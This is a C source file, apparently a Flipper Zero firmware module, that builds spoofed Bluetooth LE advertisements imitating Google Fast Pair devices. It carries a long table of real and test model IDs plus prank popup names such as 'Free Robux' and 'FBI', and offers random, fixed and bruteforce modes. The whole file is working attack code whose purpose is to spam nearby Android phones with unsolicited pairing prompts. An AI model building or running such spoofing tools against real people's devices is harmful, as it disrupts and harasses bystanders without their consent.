#include "fastpair.h"
#include "_protocols.h"

// Hacked together by @Willy-JL and @Spooks4576
// Documentation at https://developers.google.com/nearby/fast-pair/specifications/introduction

const struct {
    uint32_t value;
    const char* name;
} models[] = {
    // Genuine non-production/forgotten (good job Google)
    {0x0001F0, "Bisto CSR8670 Dev Board"},
    {0x000047, "Arduino 101"},
    {0x470000, "Arduino 101 2"},
    {0x00000A, "Anti-Spoof Test"},
    {0x0A0000, "Anti-Spoof Test 2"},
    {0x00000B, "Google Gphones"},
    {0x0B0000, "Google Gphones 2"},
    {0x0C0000, "Google Gphones 3"},
    {0x00000D, "Test 00000D"},
    {0x000007, "Android Auto"},
    {0x070000, "Android Auto 2"},
    {0x000008, "Foocorp Foophones"},
    {0x080000, "Foocorp Foophones 2"},
    {0x000009, "Test Android TV"},
    {0x090000, "Test Android TV 2"},
    {0x000035, "Test 000035"},
    {0x350000, "Test 000035 2"},
    {0x000048, "Fast Pair Headphones"},
    {0x480000, "Fast Pair Headphones 2"},
    {0x000049, "Fast Pair Headphones 3"},
    {0x490000, "Fast Pair Headphones 4"},
    {0x001000, "LG HBS1110"},
    {0x00B727, "Smart Controller 1"},
    {0x01E5CE, "BLE-Phone"},
    {0x0200F0, "Goodyear"},
    {0x00F7D4, "Smart Setup"},
    {0xF00002, "Goodyear"},
    {0xF00400, "T10"},
    {0x1E89A7, "ATS2833_EVB"},

    // Phone setup
    {0x00000C, "Google Gphones Transfer"},
    {0x0577B1, "Galaxy S23 Ultra"},
    {0x05A9BC, "Galaxy S20+"},

    // Genuine devices
    {0xCD8256, "Bose NC 700"},
    {0x0000F0, "Bose QuietComfort 35 II"},
    {0xF00000, "Bose QuietComfort 35 II 2"},
    {0x821F66, "JBL Flip 6"},
    {0xF52494, "JBL Buds Pro"},
    {0x718FA4, "JBL Live 300TWS"},
    {0x0002F0, "JBL Everest 110GA"},
    {0x92BBBD, "Pixel Buds"},
    {0x000006, "Google Pixel buds"},
    {0x060000, "Google Pixel buds 2"},
    {0xD446A7, "Sony XM5"},
    {0x2D7A23, "Sony WF-1000XM4"},
    {0x0E30C3, "Razer Hammerhead TWS"},
    {0x72EF8D, "Razer Hammerhead TWS X"},
    {0x72FB00, "Soundcore Spirit Pro GVA"},
    {0x0003F0, "LG HBS-835S"},
    {0x002000, "AIAIAI TMA-2 (H60)"},
    {0x003000, "Libratone Q Adapt On-Ear"},
    {0x003001, "Libratone Q Adapt On-Ear 2"},
    {0x00A168, "boAt  Airdopes 621"},
    {0x00AA48, "Jabra Elite 2"},
    {0x00AA91, "Beoplay E8 2.0"},
    {0x00C95C, "Sony WF-1000X"},
    {0x01EEB4, "WH-1000XM4"},
    {0x02AA91, "B&O Earset"},
    {0x01C95C, "Sony WF-1000X"},
    {0x02D815, "ATH-CK1TW"},
    {0x035764, "PLT V8200 Series"},
    {0x038CC7, "JBL TUNE760NC"},
    {0x02DD4F, "JBL TUNE770NC"},
    {0x02E2A9, "TCL MOVEAUDIO S200"},
    {0x035754, "Plantronics PLT_K2"},
    {0x02C95C, "Sony WH-1000XM2"},
    {0x038B91, "DENON AH-C830NCW"},
    {0x02F637, "JBL LIVE FLEX"},
    {0x02D886, "JBL REFLECT MINI NC"},
    {0xF00000, "Bose QuietComfort 35 II"},
    {0xF00001, "Bose QuietComfort 35 II"},
    {0xF00201, "JBL Everest 110GA"},
    {0xF00204, "JBL Everest 310GA"},
    {0xF00209, "JBL LIVE400BT"},
    {0xF00205, "JBL Everest 310GA"},
    {0xF00200, "JBL Everest 110GA"},
    {0xF00208, "JBL Everest 710GA"},
    {0xF00207, "JBL Everest 710GA"},
    {0xF00206, "JBL Everest 310GA"},
    {0xF0020A, "JBL LIVE400BT"},
    {0xF0020B, "JBL LIVE400BT"},
    {0xF0020C, "JBL LIVE400BT"},
    {0xF00203, "JBL Everest 310GA"},
    {0xF00202, "JBL Everest 110GA"},
    {0xF00213, "JBL LIVE650BTNC"},
    {0xF0020F, "JBL LIVE500BT"},
    {0xF0020E, "JBL LIVE500BT"},
    {0xF00214, "JBL LIVE650BTNC"},
    {0xF00212, "JBL LIVE500BT"},
    {0xF0020D, "JBL LIVE400BT"},
    {0xF00211, "JBL LIVE500BT"},
    {0xF00215, "JBL LIVE650BTNC"},
    {0xF00210, "JBL LIVE500BT"},
    {0xF00305, "LG HBS-1500"},
    {0xF00304, "LG HBS-1010"},
    {0xF00308, "LG HBS-1125"},
    {0xF00303, "LG HBS-930"},
    {0xF00306, "LG HBS-1700"},
    {0xF00300, "LG HBS-835S"},
    {0xF00309, "LG HBS-2000"},
    {0xF00302, "LG HBS-830"},
    {0xF00307, "LG HBS-1120"},
    {0xF00301, "LG HBS-835"},
    {0xF00E97, "JBL VIBE BEAM"},
    {0x04ACFC, "JBL WAVE BEAM"},
    {0x04AA91, "Beoplay H4"},
    {0x04AFB8, "JBL TUNE 720BT"},
    {0x05A963, "WONDERBOOM 3"},
    {0x05AA91, "B&O Beoplay E6"},
    {0x05C452, "JBL LIVE220BT"},
    {0x05C95C, "Sony WI-1000X"},
    {0x0602F0, "JBL Everest 310GA"},
    {0x0603F0, "LG HBS-1700"},
    {0x1E8B18, "SRS-XB43"},
    {0x1E955B, "WI-1000XM2"},
    {0x1EC95C, "Sony WF-SP700N"},
    {0x1ED9F9, "JBL WAVE FLEX"},
    {0x1EE890, "ATH-CKS30TW WH"},
    {0x1EEDF5, "Teufel REAL BLUE TWS 3"},
    {0x1F1101, "TAG Heuer Calibre E4 45mm"},
    {0x1F181A, "LinkBuds S"},
    {0x1F2E13, "Jabra Elite 2"},
    {0x1F4589, "Jabra Elite 2"},
    {0x1F4627, "SRS-XG300"},
    {0x1F5865, "boAt Airdopes 441"},
    {0x1FBB50, "WF-C700N"},
    {0x1FC95C, "Sony WF-SP700N"},
    {0x1FE765, "TONE-TF7Q"},
    {0x1FF8FA, "JBL REFLECT MINI NC"},
    {0x201C7C, "SUMMIT"},
    {0x202B3D, "Amazfit PowerBuds"},
    {0x20330C, "SRS-XB33"},
    {0x003B41, "M&D MW65"},
    {0x003D8A, "Cleer FLOW II"},
    {0x005BC3, "Panasonic RP-HD610N"},
    {0x008F7D, "soundcore Glow Mini"},
    {0x00FA72, "Pioneer SE-MS9BN"},
    {0x0100F0, "Bose QuietComfort 35 II"},
    {0x011242, "Nirvana Ion"},
    {0x013D8A, "Cleer EDGE Voice"},
    {0x01AA91, "Beoplay H9 3rd Generation"},
    {0x038F16, "Beats Studio Buds"},
    {0x039F8F, "Michael Kors Darci 5e"},
    {0x03AA91, "B&O Beoplay H8i"},
    {0x03B716, "YY2963"},
    {0x03C95C, "Sony WH-1000XM2"},
    {0x03C99C, "MOTO BUDS 135"},
    {0x03F5D4, "Writing Account Key"},
    {0x045754, "Plantronics PLT_K2"},
    {0x045764, "PLT V8200 Series"},
    {0x04C95C, "Sony WI-1000X"},
    {0x050F0C, "Major III Voice"},
    {0x052CC7, "MINOR III"},
    {0x057802, "TicWatch Pro 5"},
    {0x0582FD, "Pixel Buds"},
    {0x058D08, "WH-1000XM4"},
    {0x06AE20, "Galaxy S21 5G"},
    {0x06C197, "OPPO Enco Air3 Pro"},
    {0x06C95C, "Sony WH-1000XM2"},
    {0x06D8FC, "soundcore Liberty 4 NC"},
    {0x0744B6, "Technics EAH-AZ60M2"},
    {0x07A41C, "WF-C700N"},
    {0x07C95C, "Sony WH-1000XM2"},
    {0x07F426, "Nest Hub Max"},
    {0x0102F0, "JBL Everest 110GA - Gun Metal"},
    {0x0202F0, "JBL Everest 110GA - Silver"},
    {0x0302F0, "JBL Everest 310GA - Brown"},
    {0x0402F0, "JBL Everest 310GA - Gun Metal"},
    {0x0502F0, "JBL Everest 310GA - Silver"},
    {0x0702F0, "JBL Everest 710GA - Gun Metal"},
    {0x0802F0, "JBL Everest 710GA - Silver"},
    {0x054B2D, "JBL TUNE125TWS"},
    {0x0660D7, "JBL LIVE770NC"},
    {0x0103F0, "LG HBS-835"},
    {0x0203F0, "LG HBS-830"},
    {0x0303F0, "LG HBS-930"},
    {0x0403F0, "LG HBS-1010"},
    {0x0503F0, "LG HBS-1500"},
    {0x0703F0, "LG HBS-1120"},
    {0x0803F0, "LG HBS-1125"},
    {0x0903F0, "LG HBS-2000"},

    // Custom debug popups
    {0xD99CA1, "Flipper Zero"},
    {0x77FF67, "Free Robux"},
    {0xAA187F, "Free VBucks"},
    {0xDCE9EA, "Rickroll"},
    {0x87B25F, "Animated Rickroll"},
    {0xF38C02, "Boykisser"},
    {0x1448C9, "BLM"},
    {0xD5AB33, "Xtreme"},
    {0x0C0B67, "Xtreme Cta"},
    {0x13B39D, "Talking Sasquach"},
    {0xAA1FE1, "ClownMaster"},
    {0x7C6CDB, "Obama"},
    {0x005EF9, "Ryanair"},
    {0xE2106F, "FBI"},
    {0xB37A62, "Tesla"},
};
const uint8_t models_count = COUNT_OF(models);

static const char* get_name(const Payload* payload) {
    UNUSED(payload);
    return "FastPair";
}

static void make_packet(uint8_t* _size, uint8_t** _packet, Payload* payload) {
    FastpairCfg* cfg = payload ? &payload->cfg.fastpair : NULL;

    uint32_t model;
    switch(cfg ? payload->mode : PayloadModeRandom) {
    case PayloadModeRandom:
    default:
        model = models[rand() % models_count].value;
        break;
    case PayloadModeValue:
        model = cfg->model;
        break;
    case PayloadModeBruteforce:
        model = cfg->model = payload->bruteforce.value;
        break;
    }

    uint8_t size = 14;
    uint8_t* packet = malloc(size);
    uint8_t i = 0;

    packet[i++] = 3; // Size
    packet[i++] = 0x03; // AD Type (Service UUID List)
    packet[i++] = 0x2C; // Service UUID (Google LLC, FastPair)
    packet[i++] = 0xFE; // ...

    packet[i++] = 6; // Size
    packet[i++] = 0x16; // AD Type (Service Data)
    packet[i++] = 0x2C; // Service UUID (Google LLC, FastPair)
    packet[i++] = 0xFE; // ...
    packet[i++] = (model >> 0x10) & 0xFF;
    packet[i++] = (model >> 0x08) & 0xFF;
    packet[i++] = (model >> 0x00) & 0xFF;

    packet[i++] = 2; // Size
    packet[i++] = 0x0A; // AD Type (Tx Power Level)
    packet[i++] = (rand() % 120) - 100; // -100 to +20 dBm

    *_size = size;
    *_packet = packet;
}

enum {
    _ConfigExtraStart = ConfigExtraStart,
    ConfigModel,
    ConfigInfoRequire,
    ConfigCOUNT,
};
static void config_callback(void* _ctx, uint32_t index) {
    Ctx* ctx = _ctx;
    scene_manager_set_scene_state(ctx->scene_manager, SceneConfig, index);
    switch(index) {
    case ConfigModel:
        scene_manager_next_scene(ctx->scene_manager, SceneFastpairModel);
        break;
    case ConfigInfoRequire:
        break;
    default:
        ctx->fallback_config_enter(ctx, index);
        break;
    }
}
static void model_changed(VariableItem* item) {
    Payload* payload = variable_item_get_context(item);
    FastpairCfg* cfg = &payload->cfg.fastpair;
    uint8_t index = variable_item_get_current_value_index(item);
    if(index) {
        index--;
        payload->mode = PayloadModeValue;
        cfg->model = models[index].value;
        variable_item_set_current_value_text(item, models[index].name);
    } else {
        payload->mode = PayloadModeRandom;
        variable_item_set_current_value_text(item, "Random");
    }
}
static void extra_config(Ctx* ctx) {
    Payload* payload = &ctx->attack->payload;
    FastpairCfg* cfg = &payload->cfg.fastpair;
    VariableItemList* list = ctx->variable_item_list;
    VariableItem* item;
    size_t value_index;

    item = variable_item_list_add(list, "Model Code", models_count + 1, model_changed, payload);
    const char* model_name = NULL;
    char model_name_buf[9];
    switch(payload->mode) {
    case PayloadModeRandom:
    default:
        model_name = "Random";
        value_index = 0;
        break;
    case PayloadModeValue:
        for(uint8_t i = 0; i < models_count; i++) {
            if(cfg->model == models[i].value) {
                model_name = models[i].name;
                value_index = i + 1;
                break;
            }
        }
        if(!model_name) {
            snprintf(model_name_buf, sizeof(model_name_buf), "%06lX", cfg->model);
            model_name = model_name_buf;
            value_index = models_count + 1;
        }
        break;
    case PayloadModeBruteforce:
        model_name = "Bruteforce";
        value_index = models_count + 1;
        break;
    }
    variable_item_set_current_value_index(item, value_index);
    variable_item_set_current_value_text(item, model_name);

    variable_item_list_add(list, "Requires Google services", 0, NULL, NULL);

    variable_item_list_set_enter_callback(list, config_callback, ctx);
}

static uint8_t config_count(const Payload* payload) {
    UNUSED(payload);
    return ConfigCOUNT - ConfigExtraStart - 1;
}

const Protocol protocol_fastpair = {
    .icon = &I_android,
    .get_name = get_name,
    .make_packet = make_packet,
    .extra_config = extra_config,
    .config_count = config_count,
};

static void model_callback(void* _ctx, uint32_t index) {
    Ctx* ctx = _ctx;
    Payload* payload = &ctx->attack->payload;
    FastpairCfg* cfg = &payload->cfg.fastpair;
    switch(index) {
    case 0:
        payload->mode = PayloadModeRandom;
        scene_manager_previous_scene(ctx->scene_manager);
        break;
    case models_count + 1:
        scene_manager_next_scene(ctx->scene_manager, SceneFastpairModelCustom);
        break;
    case models_count + 2:
        payload->mode = PayloadModeBruteforce;
        payload->bruteforce.counter = 0;
        payload->bruteforce.value = cfg->model;
        payload->bruteforce.size = 3;
        scene_manager_previous_scene(ctx->scene_manager);
        break;
    default:
        payload->mode = PayloadModeValue;
        cfg->model = models[index - 1].value;
        scene_manager_previous_scene(ctx->scene_manager);
        break;
    }
}
void scene_fastpair_model_on_enter(void* _ctx) {
    Ctx* ctx = _ctx;
    Payload* payload = &ctx->attack->payload;
    FastpairCfg* cfg = &payload->cfg.fastpair;
    Submenu* submenu = ctx->submenu;
    uint32_t selected = 0;
    submenu_reset(submenu);

    submenu_add_item(submenu, "Random", 0, model_callback, ctx);
    if(payload->mode == PayloadModeRandom) {
        selected = 0;
    }

    bool found = false;
    for(uint8_t i = 0; i < models_count; i++) {
        submenu_add_item(submenu, models[i].name, i + 1, model_callback, ctx);
        if(!found && payload->mode == PayloadModeValue && cfg->model == models[i].value) {
            found = true;
            selected = i + 1;
        }
    }
    submenu_add_item(submenu, "Custom", models_count + 1, model_callback, ctx);
    if(!found && payload->mode == PayloadModeValue) {
        selected = models_count + 1;
    }

    submenu_add_item(submenu, "Bruteforce", models_count + 2, model_callback, ctx);
    if(payload->mode == PayloadModeBruteforce) {
        selected = models_count + 2;
    }

    submenu_set_selected_item(submenu, selected);

    view_dispatcher_switch_to_view(ctx->view_dispatcher, ViewSubmenu);
}
bool scene_fastpair_model_on_event(void* _ctx, SceneManagerEvent event) {
    UNUSED(_ctx);
    UNUSED(event);
    return false;
}
void scene_fastpair_model_on_exit(void* _ctx) {
    UNUSED(_ctx);
}

static void model_custom_callback(void* _ctx) {
    Ctx* ctx = _ctx;
    Payload* payload = &ctx->attack->payload;
    FastpairCfg* cfg = &payload->cfg.fastpair;
    payload->mode = PayloadModeValue;
    cfg->model =
        (ctx->byte_store[0] << 0x10) + (ctx->byte_store[1] << 0x08) + (ctx->byte_store[2] << 0x00);
    scene_manager_previous_scene(ctx->scene_manager);
    scene_manager_previous_scene(ctx->scene_manager);
}
void scene_fastpair_model_custom_on_enter(void* _ctx) {
    Ctx* ctx = _ctx;
    Payload* payload = &ctx->attack->payload;
    FastpairCfg* cfg = &payload->cfg.fastpair;
    ByteInput* byte_input = ctx->byte_input;

    byte_input_set_header_text(byte_input, "Enter custom Model Code");

    ctx->byte_store[0] = (cfg->model >> 0x10) & 0xFF;
    ctx->byte_store[1] = (cfg->model >> 0x08) & 0xFF;
    ctx->byte_store[2] = (cfg->model >> 0x00) & 0xFF;

    byte_input_set_result_callback(
        byte_input, model_custom_callback, NULL, ctx, (void*)ctx->byte_store, 3);

    view_dispatcher_switch_to_view(ctx->view_dispatcher, ViewByteInput);
}
bool scene_fastpair_model_custom_on_event(void* _ctx, SceneManagerEvent event) {
    UNUSED(_ctx);
    UNUSED(event);
    return false;
}
void scene_fastpair_model_custom_on_exit(void* _ctx) {
    UNUSED(_ctx);
}
